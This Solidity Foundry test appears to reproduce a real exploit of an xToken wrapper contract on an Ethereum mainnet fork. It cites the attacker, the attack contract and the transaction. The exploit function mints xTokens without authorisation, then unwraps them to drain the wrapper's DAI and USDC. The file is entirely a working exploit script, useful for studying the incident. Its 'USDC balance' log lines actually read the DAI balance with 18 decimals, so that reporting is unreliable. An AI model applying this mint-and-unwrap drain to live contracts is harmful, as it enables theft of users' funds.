// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~7729 $DAI $USDC
// Attacker : https://etherscan.io/address/0x38f68f119243adbca187e1ef64344ed475a8c69c
// Attack Contract : https://etherscan.io/address/0x3aa228a80f50763045bdfc45012da124bd0a6809
// Vulnerable Contract : https://etherscan.io/address/0x2b9dc65253c035eb21778cb3898eab5a0ada0cce
// Attack Tx : https://etherscan.io/tx/0xc0be8c3792a5b1ba7d653dc681ff611a5b79a75fe51c359cf1aac633e9441574


import "forge-std/Test.sol";
import "./../interface.sol";

interface IXTOKEN {
    function mint(address account, uint256 amount) external;
    function burnFrom(address account, uint256 amount) external;
}


interface IXTOKENWrapper {
    function unwrap(address _xToken, uint256 _amount) external;
}

interface IPROXY {
    function register(address addr, address _token, address _xToken) external;
}

contract ContractTest is Test {
    event TokenBalance(string key, uint256 val);

    IXTOKEN XTOKEN = IXTOKEN(0xD08E245Fdb3f1504aea4056e2C71615DA7001440);
    IXTOKEN XTOKEN2 = IXTOKEN(0x0a3fbF5B4cF80DB51fCAe21efe63f6a36D45d2B2);
    IXTOKENWrapper wrapper = IXTOKENWrapper(0x2b9dc65253c035Eb21778cB3898eab5A0AdA0cCe);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", 19286457 - 1);
        vm.label(address(XTOKEN), "XTOKEN");
        vm.label(address(XTOKEN2), "XTOKEN2");
        vm.label(address(wrapper), "wrapper");
        vm.label(address(DAI), "DAI");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker DAI balance before attack:", DAI.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("Attacker USDC balance before attack:", DAI.balanceOf(address(this)), 18);
        XTOKEN.mint(address(this), DAI.balanceOf(address(wrapper)));
        XTOKEN2.mint(address(this), USDC.balanceOf(address(wrapper)));
        wrapper.unwrap(address(XTOKEN), DAI.balanceOf(address(wrapper)));
        wrapper.unwrap(address(XTOKEN2), USDC.balanceOf(address(wrapper)));
        emit log_named_decimal_uint("Attacker DAI balance after attack:", DAI.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("Attacker USDC balance after attack:", DAI.balanceOf(address(this)), 18);
    }


    fallback() external payable {}
}
